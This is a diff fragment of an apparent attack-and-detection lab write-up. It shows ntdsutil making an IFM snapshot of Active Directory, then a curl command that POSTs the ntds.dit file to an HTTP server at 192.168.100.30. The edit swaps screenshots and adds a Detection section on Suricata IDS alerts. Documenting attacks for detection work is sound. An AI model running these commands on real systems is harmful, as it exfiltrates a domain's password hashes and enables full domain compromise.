@@ -7,11 +7,14 @@ First a snapshot was created using ntdsutil.exe, then data was exfilterated to a
 ntdsutil "ac i ntds" "ifm" "create full C:\Exfil_Drop" q q
 curl -X POST -H "Content-Type: application/octet-stream" --data-binary @"C:\Exfil_Drop\Active Directory\ntds.dit" http://192.168.100.30:8000/upload
 ```
-<img width="880" height="618" alt="ntds" src="https://github.com/user-attachments/assets/71bb10be-d40e-4958-b8b3-918330c1112e" />
 
-<img width="1395" height="42" alt="curl" src="https://github.com/user-attachments/assets/965ee7ae-1aa5-456d-bf63-20a1d4022e9f" />
+<img width="1562" height="617" alt="exfil-execution" src="https://github.com/user-attachments/assets/06511209-45d2-40ae-a537-05218bd50742" />
 
 ## Detection:
+
+Looking for IDS alerts, we can see network connections to the attacker using curl:
+
+<img width="1515" height="657" alt="exfil-suricata" src="https://github.com/user-attachments/assets/22c16970-469f-42b8-9838-14f6f864e0e5" />
 
 Looking for processes ran using ntdsutil:
 
